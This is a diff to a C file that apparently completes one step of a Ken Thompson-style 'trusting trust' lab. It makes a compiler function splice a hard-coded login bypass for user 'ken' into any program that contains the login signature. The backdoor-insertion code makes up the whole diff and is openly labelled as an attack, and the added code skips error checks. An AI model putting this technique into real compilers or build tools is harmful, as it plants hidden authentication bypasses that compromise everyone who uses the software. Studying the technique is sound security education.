@@ -16,8 +16,8 @@
 static void compile(char *program, char *outname) {
     FILE *fp = fopen("./temp-out.c", "w");
     assert(fp);
-    fprintf(fp, "%s", program);
-    fclose(fp);
+    // fprintf(fp, "%s", program);
+    // fclose(fp);
 
 
     /*****************************************************************
@@ -30,8 +30,22 @@ static void compile(char *program, char *outname) {
     // and inject an attack for "ken":
     static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
 
-     
+    char *c1=strstr(program, login_sig);
+    int lenst2 = strlen(c1);
+    int lenst1 = strlen(program) - lenst2;
+    int prosize = strlen(program);
+    int lenlogin_attack = strlen(login_attack);
+    int lenlogin_sig = strlen(login_sig);
 
+    char *res = malloc(prosize + lenlogin_attack+10);
+    res = strncpy(res, program, lenst1+lenlogin_sig);
+    res = strcat(res, "\n");
+    res = strcat(res, login_attack);
+    c1 += lenlogin_sig;
+    res = strcat(res, c1);    
+
+    fprintf(fp, "%s", res);
+    fclose(fp);
     /*****************************************************************
      * Step 2:
      */
